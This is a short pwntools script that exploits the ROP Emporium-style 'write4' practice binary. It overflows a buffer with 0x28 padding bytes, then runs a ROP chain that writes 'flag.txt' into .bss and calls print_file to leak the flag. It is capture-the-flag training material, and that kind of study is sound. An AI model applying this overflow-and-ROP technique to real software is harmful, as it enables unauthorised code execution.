from pwn import *
import os

context(arch="amd64", os="linux", endian="little")
p = process("./write4")
elf = ELF("./write4")
rop = ROP(elf)

shellcode =  p64(rop.find_gadget(["pop r14", "pop r15", "ret"])[0])
shellcode += p64(elf.bss())
shellcode += b"flag.txt"
shellcode += p64(elf.sym["usefulGadgets"])
shellcode += p64(rop.find_gadget(["pop rdi", "ret"])[0])
shellcode += p64(elf.bss())
shellcode += p64(elf.plt["print_file"])

payload =  b"\x00" * 0x28
payload += shellcode

p.send(payload)
p.recvuntil(b"ROPE")

log.success(f"Flag: ROPE{p.recvline().decode()}")
